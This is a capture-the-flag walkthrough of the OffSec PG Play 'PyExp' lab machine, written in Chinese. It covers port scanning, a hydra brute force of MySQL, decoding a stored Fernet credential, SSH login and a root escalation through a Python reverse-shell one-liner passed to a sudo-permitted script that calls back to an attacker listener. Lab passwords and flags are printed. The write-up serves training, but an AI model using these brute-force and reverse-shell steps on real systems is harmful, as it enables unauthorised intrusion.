###### tags: `Offsec` `PG Play` `Easy` `Linux`

# PyExp
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.217.118 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.217.118:1337
Open 192.168.217.118:3306

PORT     STATE SERVICE REASON  VERSION
1337/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
|   Thread ID: 41
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, SupportsCompression, IgnoreSigpipes, LongColumnFlag, IgnoreSpaceBeforeParenthesis, FoundRows, ODBCClient, SupportsLoadDataLocal, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, InteractiveClient, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 8[BuLYZ;Ssh/Q(t3<tT)
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`hydra`破`mysql`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ hydra -l root -P /home/kali/rockyou.txt 192.168.217.118 mysql

[3306][mysql] host: 192.168.217.118   login: root   password: prettywoman
```

登入
```
┌──(kali㉿kali)-[~/pgplay]
└─$ mysql -u root -p -h 192.168.217.118
Enter password: prettywoman

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.069 sec)

MariaDB [(none)]> use data;
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.067 sec)

MariaDB [data]> select * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
```

搜尋[Fernet (Decode)](https://asecuritysite.com/tokens/ferdecode)
```
Token:	
gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=
Key: UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=

Decoded:	lucy:wJ9`"Lemdv9[FEw-
Date created:	Mon Aug 10 21:02:44 2020
Current time:	Tue May 28 01:42:58 2024

======Analysis====
Decoded data:  80000000005f31b5f46ea5894d37472946181bd53963a2460a980488baa6608565581eedf20becb9ac9f84b38efdc1e7250175fe26efd78b22d4c6cbec382df4e764f262870172e1c8766995ac74bf4d8c33387fcff788ef2b
Version:	80
Date created:	000000005f31b5f4
IV:		6ea5894d37472946181bd53963a2460a
Cipher:		980488baa6608565581eedf20becb9ac9f84b38efdc1e7250175fe26efd78b22
HMAC:		d4c6cbec382df4e764f262870172e1c8766995ac74bf4d8c33387fcff788ef2b

======Converted====
IV:		6ea5894d37472946181bd53963a2460a
Time stamp:	1597093364
Date created:	Mon Aug 10 21:02:44 2020
```

用`lucy`跟```wJ9`"Lemdv9[FEw-```登入，在`/home/lucy`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh lucy@192.168.217.118 -p 1337

lucy@192.168.217.118's password: wJ9`"Lemdv9[FEw-

lucy@pyexp:~$ cat local.txt
d2eed34cfa7ce6a816b1d5694f7621c7
```

`sudo -l`
```
lucy@pyexp:/tmp$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp8888

lucy@pyexp:/opt$ sudo /usr/bin/python2 /opt/exp.py
how are you?import os,pty,socket;s=socket.socket();s.connect(("192.168.45.192",8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")
```

等反彈得root，在/root得proof.txt
```

# cat proof.txt
bb679094e2fc2cc2591b04f980c436a9
```
